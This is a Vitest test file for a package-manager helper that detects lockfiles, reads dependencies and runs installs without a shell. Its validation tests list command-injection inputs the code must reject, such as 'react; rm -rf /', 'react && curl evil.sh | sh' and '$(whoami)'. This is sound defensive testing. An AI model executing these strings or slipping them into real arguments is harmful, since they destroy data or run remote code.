// @vitest-environment node
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdirSync, writeFileSync, rmSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import type * as ChildProcess from "child_process";
import {
  assertValidDepSpecs,
  depName,
  detectPm,
  formatInstallCommand,
  installCommand,
  installedDeps,
  isValidDepSpec,
  runInstall,
} from "../lib/pm";

const spawnSync = vi.hoisted(() => vi.fn());
vi.mock("child_process", async (importOriginal) => ({
  ...(await importOriginal<typeof ChildProcess>()),
  spawnSync,
}));

let tmpDir: string;

beforeEach(() => {
  tmpDir = join(tmpdir(), `hilum-blocks-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(tmpDir, { recursive: true });
});

afterEach(() => {
  rmSync(tmpDir, { recursive: true, force: true });
});

/* ------------------------------------------------------------------ */
/* detectPm                                                             */
/* ------------------------------------------------------------------ */

describe("detectPm", () => {
  it("detects pnpm when pnpm-lock.yaml exists", () => {
    writeFileSync(join(tmpDir, "pnpm-lock.yaml"), "");
    expect(detectPm(tmpDir)).toBe("pnpm");
  });

  it("detects yarn when yarn.lock exists", () => {
    writeFileSync(join(tmpDir, "yarn.lock"), "");
    expect(detectPm(tmpDir)).toBe("yarn");
  });

  it("falls back to npm when no lock file found", () => {
    expect(detectPm(tmpDir)).toBe("npm");
  });

  it("detects bun from bun.lock and bun.lockb", () => {
    writeFileSync(join(tmpDir, "bun.lock"), "");
    expect(detectPm(tmpDir)).toBe("bun");
    rmSync(join(tmpDir, "bun.lock"));
    writeFileSync(join(tmpDir, "bun.lockb"), "");
    expect(detectPm(tmpDir)).toBe("bun");
  });

  it("walks up to the nearest lockfile (monorepo package)", () => {
    writeFileSync(join(tmpDir, "yarn.lock"), "");
    const pkgDir = join(tmpDir, "packages", "app");
    mkdirSync(pkgDir, { recursive: true });
    expect(detectPm(pkgDir)).toBe("yarn");
  });

  it("prefers the nearest directory's lockfile", () => {
    writeFileSync(join(tmpDir, "yarn.lock"), "");
    const pkgDir = join(tmpDir, "app");
    mkdirSync(pkgDir);
    writeFileSync(join(pkgDir, "package-lock.json"), "");
    expect(detectPm(pkgDir)).toBe("npm");
  });

  it("prefers pnpm over yarn when both exist", () => {
    writeFileSync(join(tmpDir, "pnpm-lock.yaml"), "");
    writeFileSync(join(tmpDir, "yarn.lock"), "");
    expect(detectPm(tmpDir)).toBe("pnpm");
  });
});

/* ------------------------------------------------------------------ */
/* installedDeps                                                        */
/* ------------------------------------------------------------------ */

describe("installedDeps", () => {
  it("returns empty set when no package.json", () => {
    expect(installedDeps(tmpDir).size).toBe(0);
  });

  it("returns empty set when package.json is malformed", () => {
    writeFileSync(join(tmpDir, "package.json"), "INVALID JSON");
    expect(installedDeps(tmpDir).size).toBe(0);
  });

  it("returns all dependencies and devDependencies", () => {
    const pkg = {
      dependencies: { react: "^19.0.0", "class-variance-authority": "^0.7.0" },
      devDependencies: { typescript: "^5.7.0", vitest: "^3.2.0" },
    };
    writeFileSync(join(tmpDir, "package.json"), JSON.stringify(pkg));
    const deps = installedDeps(tmpDir);
    expect(deps.has("react")).toBe(true);
    expect(deps.has("class-variance-authority")).toBe(true);
    expect(deps.has("typescript")).toBe(true);
    expect(deps.has("vitest")).toBe(true);
  });

  it("handles package.json with only dependencies (no devDependencies)", () => {
    const pkg = { dependencies: { lodash: "^4.17.21" } };
    writeFileSync(join(tmpDir, "package.json"), JSON.stringify(pkg));
    const deps = installedDeps(tmpDir);
    expect(deps.has("lodash")).toBe(true);
  });

  it("handles package.json with no dependencies at all", () => {
    const pkg = { name: "my-app", version: "1.0.0" };
    writeFileSync(join(tmpDir, "package.json"), JSON.stringify(pkg));
    expect(installedDeps(tmpDir).size).toBe(0);
  });
});

/* ------------------------------------------------------------------ */
/* dependency spec validation                                           */
/* ------------------------------------------------------------------ */

describe("isValidDepSpec", () => {
  it.each([
    "react",
    "lucide-react",
    "@hilum/ui",
    "@hilum/ui@^3.3.4",
    "class-variance-authority@0.7.1",
    "react@next",
    "motion@~12.0.0",
    "lodash.merge@4.x",
  ])("accepts %s", (spec) => {
    expect(isValidDepSpec(spec)).toBe(true);
  });

  it.each([
    "",
    "react; rm -rf /",
    "react && curl evil.sh | sh",
    "$(whoami)",
    "`id`",
    "--registry=https://evil",
    "-g",
    ".hidden",
    "React",
    "a b",
    "react@>=1 <2",
    "react@1|2",
    "@scope/",
    "../../etc",
    "a".repeat(215),
  ])("rejects %j", (spec) => {
    expect(isValidDepSpec(spec)).toBe(false);
  });

  it("assertValidDepSpecs names the offending specs", () => {
    expect(() => assertValidDepSpecs(["react", "x; rm -rf ~"])).toThrow(
      /invalid dependency spec.*x; rm -rf ~/i,
    );
    expect(() => assertValidDepSpecs(["react", "@hilum/ui@^3"])).not.toThrow();
  });

  it("depName strips the version", () => {
    expect(depName("@hilum/ui@^3.0.0")).toBe("@hilum/ui");
    expect(depName("react@19")).toBe("react");
    expect(depName("react")).toBe("react");
  });
});

/* ------------------------------------------------------------------ */
/* install                                                              */
/* ------------------------------------------------------------------ */

describe("installCommand", () => {
  it("builds an args array per package manager", () => {
    expect(installCommand("pnpm", ["a", "b"])).toEqual({
      command: "pnpm",
      args: ["add", "a", "b"],
    });
    expect(installCommand("yarn", ["a"])).toEqual({ command: "yarn", args: ["add", "a"] });
    expect(installCommand("bun", ["a"])).toEqual({ command: "bun", args: ["add", "a"] });
    expect(installCommand("npm", ["a"])).toEqual({ command: "npm", args: ["install", "a"] });
    expect(formatInstallCommand("bun", ["a", "b"])).toBe("bun add a b");
  });
});

describe("runInstall", () => {
  beforeEach(() => {
    spawnSync.mockReset();
    vi.spyOn(console, "log").mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("spawns without a shell, passing deps as separate args", () => {
    if (process.platform === "win32") return;
    spawnSync.mockReturnValue({ status: 0 });
    runInstall(["react", "@hilum/ui@^3"], tmpDir, "pnpm");
    expect(spawnSync).toHaveBeenCalledWith("pnpm", ["add", "react", "@hilum/ui@^3"], {
      cwd: tmpDir,
      stdio: "inherit",
      shell: false,
    });
  });

  it("refuses invalid specs without spawning anything", () => {
    expect(() => runInstall(["react", "x && touch pwned"], tmpDir, "npm")).toThrow(
      /invalid dependency spec/i,
    );
    expect(spawnSync).not.toHaveBeenCalled();
  });

  it("throws when the package manager exits non-zero", () => {
    spawnSync.mockReturnValue({ status: 1 });
    expect(() => runInstall(["react"], tmpDir, "npm")).toThrow(/exited with code 1/);
  });

  it("throws when the package manager cannot be spawned", () => {
    spawnSync.mockReturnValue({ status: null, error: new Error("ENOENT") });
    expect(() => runInstall(["react"], tmpDir, "bun")).toThrow("ENOENT");
  });

  it("uses quoted args with the .cmd shim on Windows", () => {
    const platform = Object.getOwnPropertyDescriptor(process, "platform")!;
    Object.defineProperty(process, "platform", { value: "win32" });
    try {
      spawnSync.mockReturnValue({ status: 0 });
      runInstall(["react@^19"], tmpDir, "npm");
      expect(spawnSync).toHaveBeenCalledWith("npm.cmd", ['"install"', '"react@^19"'], {
        cwd: tmpDir,
        stdio: "inherit",
        shell: true,
      });
    } finally {
      Object.defineProperty(process, "platform", platform);
    }
  });
});
